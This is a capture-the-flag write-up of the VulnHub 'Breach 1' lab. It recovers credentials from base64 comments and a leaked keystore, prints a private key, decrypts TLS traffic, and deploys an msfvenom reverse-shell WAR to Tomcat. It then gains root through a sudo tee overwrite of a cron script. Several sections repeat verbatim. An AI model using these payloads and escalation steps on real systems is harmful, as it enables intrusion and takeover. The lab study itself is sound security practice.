
<https://unit42.paloaltonetworks.com/wireshark-tutorial-decrypting-https-traffic/>

<https://medium.com/@erictee2012/vulnhub-writeup-breach-1-94472f5afd3f>
    
<http://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1/>

<https://github.com/drk1wi/portspoof>
    

# Keysword

impresscms, Java KeyStore, keytool, openssl, burp suite, tomcat, sudo -l, decrypting https traffic, wireshark, portspoof

# Web service on port 80

    └─$ curl http://192.168.110.140/
    <!DOCTYPE html>

    <html>
    <head>
    <title>Welcome to Breach 1.0</title>
    </head>


    <body bgcolor="#000000">

    <font color="green">
    <p>Initech was breached and the board of directors voted to bring in their internal Initech Cyber Consulting, LLP division to assist. Given the high profile nature of the breach and nearly catastrophic losses, there have been many subsequent attempts against the company. Initech has tasked their TOP consultants, led by Bill Lumbergh, CISSP and Peter Gibbons, C|EH, SEC+, NET+, A+ to contain and perform analysis on the breach.</p> 

    <p>Little did the company realize that the breach was not the work of skilled hackers, but a parting gift from a disgruntled former employee on his way out. The TOP consultants have been hard at work containing the breach. 
    However, their own work ethics and the mess left behind may be the company's downfall.</p>

    <center><a href="initech.html" target="_blank"> <img src="/images/milton_beach.jpg" 
    width=500 height=500> </a></center>

    <p>Little did the company realize that the breach was not the work of skilled hackers, but a parting gift from a disgruntled former employee on his way out. The TOP consultants have been hard at work containing the breach. 
    However, their own work ethics and the mess left behind may be the company's downfall.</p>

    <center><a href="initech.html" target="_blank"> <img src="/images/milton_beach.jpg" 
    width=500 height=500> </a></center>



    <!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->

    </body>
    </html> 


    $ wget http://192.168.56.110/images/bill.png
    $ exiftool bill.png
    ExifTool Version Number         : 12.16
    File Name                       : bill.png
    Directory                       : .
    File Size                       : 315 KiB
    File Modification Date/Time     : 2016:06:05 01:35:33+02:00
    File Access Date/Time           : 2021:04:12 07:43:03+02:00
    File Inode Change Date/Time     : 2021:04:12 07:42:57+02:00
    File Permissions                : rw-r--r--
    File Type                       : PNG
    File Type Extension             : png
    MIME Type                       : image/png
    Image Width                     : 610
    Image Height                    : 327
    Bit Depth                       : 8
    Color Type                      : RGB with Alpha
    Compression                     : Deflate/Inflate
    Filter                          : Adaptive
    Interlace                       : Noninterlaced
    Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
    Comment                         : coffeestains  <== HERE
    Image Size                      : 610x327
    Megapixels                      : 0.199                                                                


## Decode the code

    $ wget http://192.168.56.110/images/bill.png
    $ exiftool bill.png
    ExifTool Version Number         : 12.16
    File Name                       : bill.png
    Directory                       : .
    File Size                       : 315 KiB
    File Modification Date/Time     : 2016:06:05 01:35:33+02:00
    File Access Date/Time           : 2021:04:12 07:43:03+02:00
    File Inode Change Date/Time     : 2021:04:12 07:42:57+02:00
    File Permissions                : rw-r--r--
    File Type                       : PNG
    File Type Extension             : png
    MIME Type                       : image/png
    Image Width                     : 610
    Image Height                    : 327
    Bit Depth                       : 8
    Color Type                      : RGB with Alpha
    Compression                     : Deflate/Inflate
    Filter                          : Adaptive
    Interlace                       : Noninterlaced
    Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
    Comment                         : coffeestains  <== HERE
    Image Size                      : 610x327
    Megapixels                      : 0.199                                                                

## Decode the code

    $ echo Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d | base64 -d
    pgibbons:damnitfeel$goodtobeagang$ta


## Connect to impresscms with pgibbons:damnitfeel$goodtobeagang$ta

### inbox


> Posting sensitive content
> 
> Peter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill
> 
> -- 
> 
> IDS/IPS system
> 
> Hey Peter,
> 
> I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie's last week!
> 
> -Michael
> 
> --
> 
> FWD: Thank you for your purchase of Super Secret Cert Pro!
> 
> Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob 
> 
> 
> SSL implementation test capture
> Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)
> Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.


==> Found keystore at http://192.168.56.140/.keystore

==> Found pcap file at http://192.168.56.140/impresscms/_SSL_test_phase1.pcap

# Keytool

## Extract the certificate from the keystore.

    $ keytool -list -keystore keystore                                                                                          
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    Enter keystore password:  tomcat
    Keystore type: JKS
    Keystore provider: SUN

    Your keystore contains 1 entry

    tomcat, May 20, 2016, PrivateKeyEntry, 
    Certificate fingerprint (SHA-256): F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31

    Warning:
    The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using "keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12".


    $ keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12                                
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    Enter source keystore password:  tomcat
    Entry for alias tomcat successfully imported.
    Import command completed:  1 entries successfully imported, 0 entries failed or cancelled

    Warning:
    Migrated "keystore" to PKCS12. The JKS keystore is backed up as "keystore.old".



Decode pcap file with wireshark with the key _keystore_  (Edit --> Preferences --> Protocols --> TLS --> RSA keys list, Edit --> IP address : 192.168.110.140, Port : 8443, Protocol :http, Key file : _keystore_, Password : tomcat


    /_M@nag3Me/html/shell

    $ echo dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d
    tomcat:Tt\5D8F(#!*u=G)4m7zB


## tomcat certificate keystore

    $ keytool -list -v -keystore keystore.old 

    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    Enter keystore password:  tomcat
    Keystore type: JKS
    Keystore provider: SUN

    Your keystore contains 1 entry

    tomcat, May 20, 2016, PrivateKeyEntry, 
    Certificate fingerprint (SHA-256): F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31

    Warning:
    The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using "keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12".


    $ keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12                                
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    Enter source keystore password:  tomcat
    Entry for alias tomcat successfully imported.
    Import command completed:  1 entries successfully imported, 0 entries failed or cancelled

    Warning:
    Migrated "keystore" to PKCS12. The JKS keystore is backed up as "keystore.old".



Decode pcap file with wireshark with the key _keystore_  (Edit --> Preferences --> Protocols --> TLS --> RSA keys list, Edit --> IP address : 192.168.110.140, Port : 8443, Protocol :http, Key file : _keystore_, Password : tomcat


    /_M@nag3Me/html/shell

    $ echo dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d
    tomcat:Tt\5D8F(#!*u=G)4m7zB


## tomcat certificate keystore

    $ keytool -list -v -keystore keystore.old 
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    Enter keystore password:  tomcat
    Keystore type: JKS
    Keystore provider: SUN

    Your keystore contains 1 entry

    Alias name: tomcat
    Creation date: May 20, 2016
    Entry type: PrivateKeyEntry
    Certificate chain length: 1
    Certificate[1]:
    Owner: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
    Issuer: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
    Serial number: 60856e88
    Valid from: Fri May 20 19:51:07 CEST 2016 until: Thu Aug 18 19:51:07 CEST 2016
    Certificate fingerprints:
             SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53
             SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31
    Signature algorithm name: SHA256withRSA
    Subject Public Key Algorithm: 2048-bit RSA key
    Version: 3

    Extensions: 

    #1: ObjectId: 2.5.29.14 Criticality=false
    SubjectKeyIdentifier [
    KeyIdentifier [
    0000: 47 6B A3 37 ED A5 1F 0A   0D 61 CA AA 17 9C F4 8C  Gk.7.....a......
    0010: 10 64 87 DF                                        .d..
    ]
    ]



    *******************************************
    *******************************************                                                                                    
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
    Warning:                                                                                                                       
    The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using "keytool -importkeystore -srckeystore keystore.old -destkeystore keystore.old -deststoretype pkcs12". 

## extract private key from the keystore

    $ keytool -v -importkeystore -srckeystore keystore.old -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12    
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    Importing keystore keystore.old to myp12file.p12...
    Enter destination keystore password:  
    Re-enter new password: 
    Enter source keystore password:  
    [Storing myp12file.p12]

## check the private key

    $ openssl pkcs12 -in myp12file.p12 -nocerts -nodes                                                                           
    Enter Import Password:
    Bag Attributes
        friendlyName: tomcat
        localKeyID: 54 69 6D 65 20 31 36 33 38 31 36 32 35 38 35 32 39 37 
    Key Attributes: <No Attributes>
    -----BEGIN PRIVATE KEY-----
    MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
    ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
    HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
    ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
    UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
    nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
    F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
    cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
    SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
    shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
    sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
    sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
    PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
    oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
    XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
    TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
    Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
    hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
    fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
    EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
    ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
    23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
    Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
    geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
    3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
    pHiPhbocjixKJz9xx+pG0jDkrg==
    -----END PRIVATE KEY-----


# Upload web shell with tomcat web application manager
    
## Connect to tomcat

    Use Burp suite https://192.168.56.140:8443/_M@nag3Me/html

    $ echo dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d
    tomcat:Tt\5D8F(#!*u=G)4m7zB

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f war > update.war

    ls -al /home/
    total 16
    drwxr-xr-x  4 root      root      4096 Jun  4  2016 .
    drwxr-xr-x 22 root      root      4096 Jun  4  2016 ..
    drwxr-xr-x  3 blumbergh blumbergh 4096 Jun 12  2016 blumbergh
    drwxr-xr-x  3 milton    milton    4096 Jun  6  2016 milton

## Gain blumbergh connection

    tomcat6@Breach:/etc$ su blumbergh
    su blumbergh
    Password: coffeestains


# Get root

    blumbergh@Breach:/etc$ sudo -l
    sudo -l
    Matching Defaults entries for blumbergh on Breach:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User blumbergh may run the following commands on Breach:
        (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh

    ls -al /usr/share/cleanup/tidyup.sh
    -rwxr-xr-x 1 root root 47 Nov 27 06:13 /usr/share/cleanup/tidyup.sh

    cat /usr/share/cleanup/tidyup.sh
    #!/bin/bash

    #Hacker Evasion Script 
    #Initech Cyber Consulting, LLC
    #Peter Gibbons and Michael Bolton - 2016
    #This script is set to run every 3 minutes as an additional defense measure against hackers.

    cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
    blumbergh@Breach:/etc$ 

    echo 'cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

    blumbergh@Breach:/tmp$ ./bash -p
    

    ./bash -p
    bash-4.3# id
    id
    uid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) groups=0(root),1001(blumbergh)


    bash-4.3# cat b.c
    cat b.c
    void main() {
            setuid(0);
            setgid(0);
            system("/bin/bash");
    }


    bash-4.3# gcc b.c -o b
    ./b
    root@Breach:~# id    
    uid=0(root) gid=0(root) groups=0(root),1001(blumbergh)



# Box's configuration

    root@Breach:/etc/init.d# netstat -tlupn
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1013/portspoof  
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      941/mysqld      
    tcp6       0      0 :::80                   :::*                    LISTEN      1092/apache2    
    tcp6       0      0 :::8443                 :::*                    LISTEN      1174/java       
    tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1174/java       

    cat portly.sh
    #!/bin/bash

    iptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D

    cat portly.sh
    #!/bin/bash

    iptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D


    root@Breach:/etc# crontab -l
    */3 * * * * /usr/share/cleanup/tidyup.sh
